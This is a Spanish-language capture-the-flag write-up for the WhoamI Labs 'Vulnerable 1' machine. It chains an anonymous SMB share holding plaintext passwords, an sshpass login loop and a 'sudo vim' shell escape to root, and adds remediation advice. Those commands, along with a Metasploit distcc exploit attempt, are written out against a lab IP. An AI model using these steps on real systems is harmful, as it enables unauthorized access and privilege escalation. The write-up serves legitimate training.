---
title: "WhoamI Labs - Vulnerable 1"
date: 2026-08-10 21:15:00 +0000
categories: [CTF, WhoamiLabs]
tags: [smb, credential-exposure, ssh, sudo-misconfig, gtfobins, vim]
---

## 📋 Resumen Ejecutivo

El laboratorio "Vulnerable 1" expone una superficie de ataque amplia (17 puertos), pero el vector real resulta ser un **share SMB (`cosmos`) con permisos de escritura/lectura para sesiones anónimas**, que contiene un archivo con credenciales en texto plano. Una de esas credenciales tiene una regla de **sudo mal configurada sobre `/usr/bin/vim`**, permitiendo escalar a root mediante una técnica documentada en GTFOBins.

| Campo | Valor |
|---|---|
| Plataforma | WhoamI Labs |
| Dificultad | Fácil |
| IP objetivo | 172.17.0.2 |
| Vulnerabilidad principal | SMB anónimo escribible → Credential Exposure → SSH → Sudo Misconfig (vim) |

![Laboratorio desplegado — objetivo 172.17.0.2](/assets/img/posts/whoami-labs-vulnerable-1/01-lab-launch.png)

## 🔍 Reconocimiento

```bash
nmap -sV -sC -p- 172.17.0.2 -oN recon_vuln1.txt
```

Superficie amplia — 17 puertos abiertos, entre ellos:

![nmap -sV -sC -p- — 17 puertos abiertos](/assets/img/posts/whoami-labs-vulnerable-1/02-nmap-recon.png)

**Priorización:** ante tantos servicios, se descartan primero los de menor probabilidad (mail, bases de datos sin credenciales previas) y se prueban primero los vectores de "bajo esfuerzo / alto impacto": `distccd` (RCE sin autenticación conocido) y los shares SMB.

## 🚫 Vector descartado — distcc

```bash
nmap -p 3632 --script distcc-cve2004-2687 172.17.0.2
msfconsole -q
search distcc
use exploit/unix/misc/distcc_exec
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
check
```
![Fallo de distcc + inicio de enumeración SMB](/assets/img/posts/whoami-labs-vulnerable-1/03-distcc-fail-smb-enum.png)

**Nota:** el nmap original marcaba el servicio como `distccd?` (con signo de interrogación — detección heurística, no confirmada). El `check` de Metasploit falla consistentemente con `ECONNRESET`, indicando que el servicio no responde al protocolo esperado. Se descarta esta vía y se pivota a SMB, donde el mismo listado de shares (`smbclient -L`) ya se aprecia en esta captura: aparece el share custom `cosmos`.

## 🕸️ Enumeración SMB — permisos

```bash
nxc smb 172.17.0.2 -u '' -p '' --shares
```
![NetExec confirma permisos READ,WRITE en el share cosmos con sesión nula](/assets/img/posts/whoami-labs-vulnerable-1/04-netexec-shares-permissions.png)

**Hallazgo crítico:** el share `cosmos` permite lectura **y escritura** con sesión anónima (`Null Auth: True`), además de `signing:False` como configuración insegura adicional.

## 🔑 Exposición de Credenciales

```bash
smbclient //172.17.0.2/cosmos -N
smb: \> ls
smb: \> get passwords.txt
smb: \> exit
```

![Descarga de passwords.txt vía SMB anónimo](/assets/img/posts/whoami-labs-vulnerable-1/05-smbclient-cosmos-get.png)

```bash
cat passwords.txt
```
![Contenido de passwords.txt — credenciales en texto plano](/assets/img/posts/whoami-labs-vulnerable-1/06-passwords-txt-content.png)

**Nota temática:** los usuarios (`athena`, `seiya`, `hades`) y el nombre del share (`cosmos`) son referencias a Saint Seiya / Los Caballeros del Zodiaco.

## 🔓 Validación de credenciales vía SSH

```bash
for user in athena seiya hades; do
  case $user in
    athena) pass="cosmo" ;;
    seiya) pass="pegasus" ;;
    hades) pass="underworld" ;;
  esac
  echo "--- Probando $user:$pass ---"
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@172.17.0.2 "whoami" 2>&1
done
```

![Prueba dirigida de las tres credenciales vía SSH — las tres válidas](/assets/img/posts/whoami-labs-vulnerable-1/07-ssh-bruteforce-loop.png)

**Resultado:** las tres credenciales son válidas — a diferencia de otros laboratorios donde solo una credencial de la lista funcionaba, aquí los tres usuarios tienen acceso legítimo por SSH.

## 🧭 Selección de usuario — comparación de privilegios

```bash
for user in athena seiya hades; do
  case $user in
    athena) pass="cosmo" ;;
    seiya) pass="pegasus" ;;
    hades) pass="underworld" ;;
  esac
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no $user@172.17.0.2 "id; sudo -l 2>&1"
done
```
![Comparación de id y sudo -l para los tres usuarios](/assets/img/posts/whoami-labs-vulnerable-1/08-sudo-l-comparison.png)

**Hallazgo:** solo `seiya` tiene una entrada de sudo configurada — `NOPASSWD: /usr/bin/vim`. Este es el usuario diseñado para la ruta de escalada.

## 🔑 Sesión interactiva SSH

```bash
sshpass -p "pegasus" ssh -o StrictHostKeyChecking=no seiya@172.17.0.2
```

![Login SSH interactivo exitoso como seiya](/assets/img/posts/whoami-labs-vulnerable-1/09-ssh-login-seiya.png)

## ⬆️ Escalada de Privilegios — GTFOBins (vim)

```bash
sudo vim -c ':!/bin/bash' -c ':q'
whoami
id
find / -iname "flag*" 2>/dev/null
```

**Desglose:** `vim` puede ejecutar comandos de shell desde su modo Ex mediante `:!comando`. Como `sudo` permite correr `vim` como root sin contraseña, el `/bin/bash` invocado desde dentro de vim hereda esos privilegios — técnica catalogada en [GTFOBins](https://gtfobins.github.io/gtfobins/vim/#sudo).

![Escalada exitosa, confirmación de root, y localización de la flag](/assets/img/posts/whoami-labs-vulnerable-1/10-sudo-vim-privesc.png)

## 🚩 Lectura de la flag

```bash
cat /root/flag.txt
```
![Flag capturada como root](/assets/img/posts/whoami-labs-vulnerable-1/11-flag-capture.png)

## ✅ Validación en la plataforma

![Laboratorio completado — flag validada por WhoamI Labs](/assets/img/posts/whoami-labs-vulnerable-1/12-lab-completed-validation.png)

## 📊 Cadena de Explotación (Kill Chain)

## 🛡️ Recomendaciones de Remediación

1. **Permisos de share SMB:** el share `cosmos` no debería permitir escritura (ni lectura, idealmente) con sesión anónima; restringir `guest ok = no` y aplicar ACLs adecuadas.
2. **Exposición de credenciales:** nunca almacenar credenciales en texto plano en ubicaciones accesibles sin autenticación fuerte.
3. **Message signing SMB:** habilitar `server signing = mandatory` para mitigar ataques de relay/tampering (actualmente `disabled`).
4. **Sudo Misconfiguration:** eliminar `NOPASSWD` sobre binarios con capacidad de ejecución de shell (`vim`, `less`, `find`, etc. — catalogados en GTFOBins); si se requiere sudo sobre `vim`, restringir mediante `Cmnd_Alias` a archivos específicos y deshabilitar el modo shell.
5. **Reutilización de contraseñas:** aunque no se explotó directamente aquí, las tres credenciales funcionando en SSH sugiere políticas débiles de gestión de contraseñas en el sistema.

## 🧠 Lecciones aprendidas

- Ante una superficie de ataque amplia, priorizar por "bajo esfuerzo / alto impacto" (RCE sin auth conocidos) antes de enumerar exhaustivamente todos los servicios — aunque en este caso el primer candidato (`distcc`) no funcionó, descartarlo rápido permitió pivotar sin perder mucho tiempo.
- Un signo de interrogación en la detección de servicio de nmap (`distccd?`) es una señal de que la identificación es heurística, no confirmada — vale la pena verificar con herramientas dedicadas antes de invertir tiempo en ese vector.
- Cuando varias credenciales encontradas resultan válidas, comparar privilegios (`id`, `sudo -l`) de cada una antes de profundizar identifica rápidamente cuál es la ruta "diseñada" de escalada, evitando explorar a ciegas con el usuario equivocado.
- GTFOBins sigue siendo la referencia obligada para escalada de privilegios vía sudo — `vim`, igual que `find` en laboratorios anteriores, es un binario aparentemente inocuo con capacidad de ejecución de shell que lo convierte en vector de privesc cuando se le otorga sudo sin restricciones.
